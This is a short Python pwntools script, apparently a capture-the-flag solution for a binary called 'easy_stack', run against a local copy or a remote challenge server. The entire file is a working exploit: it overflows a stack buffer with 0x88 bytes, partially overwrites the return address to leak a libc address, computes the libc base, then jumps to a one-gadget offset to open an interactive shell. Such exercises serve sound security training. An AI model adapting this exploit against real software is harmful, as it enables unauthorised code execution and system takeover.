import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./easy_stack')
	elf=ELF('./easy_stack')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('nc.eonew.cn',10004)
	elf=ELF('./easy_stack')
	libc=ELF('./libc-2.27.so')

pay='a'*0x88+'\x53'
io.sendline(pay)
io.recv(0x88)
libc_base=u64(io.recv(6)+'\x00\x00')-0x21b53
success('libc_base:'+hex(libc_base))
pay='a'*0x88+p64(libc_base+0x10a38c)
io.sendline(pay)

#gdb.attach(io)
#pause()
io.interactive()